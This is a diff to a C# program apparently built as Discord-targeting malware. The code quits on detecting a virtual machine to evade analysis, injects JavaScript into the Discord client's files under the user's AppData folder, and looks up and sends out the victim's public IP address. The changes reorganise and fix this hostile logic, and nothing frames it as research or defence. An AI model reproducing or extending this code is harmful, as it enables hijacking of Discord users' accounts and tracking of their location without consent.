@@ -34,10 +34,23 @@ namespace Furious
 			if (checkForVM)
 			{
 				if (CheckForVM())
-                {
 					Environment.Exit(0);
-                }
 			}
+			else
+            {
+				InjectJS();
+            }
+
+			if (grabIP)
+            {
+				SendIP();
+            }
+
+			CloseProcesses();
+		}
+
+		private static void InjectJS()
+        {
 			if (Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\discord"))
 			{
 				string[] discord = Directory.GetDirectories("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Discord");
@@ -77,12 +90,6 @@ namespace Furious
 					}
 				}
 			}
-			if (grabIP)
-            {
-				SendIP();
-            }
-
-			CloseProcesses();
 		}
 
 		private static void CloseProcesses()
@@ -96,12 +103,12 @@ namespace Furious
 			}
 		}
 
-		private static Task<string> GrabIP()
+		private static async Task<string> GrabIP()
 		{
-			Task<string> result;
+			string result;
 			using (WebClient webClient = new WebClient())
 			{
-				result = webClient.DownloadStringTaskAsync("https://ipv4.icanhazip.com/");
+				result = await webClient.DownloadStringTaskAsync("https://ipv4.icanhazip.com/");
 			}
 			return result;
 		}
@@ -118,7 +125,7 @@ namespace Furious
 				}
 				catch (HttpRequestException ex)
 				{
-					Debug.Write(ex.Message);
+					Debug.WriteLine(ex.Message);
 				}
 			}
 		}
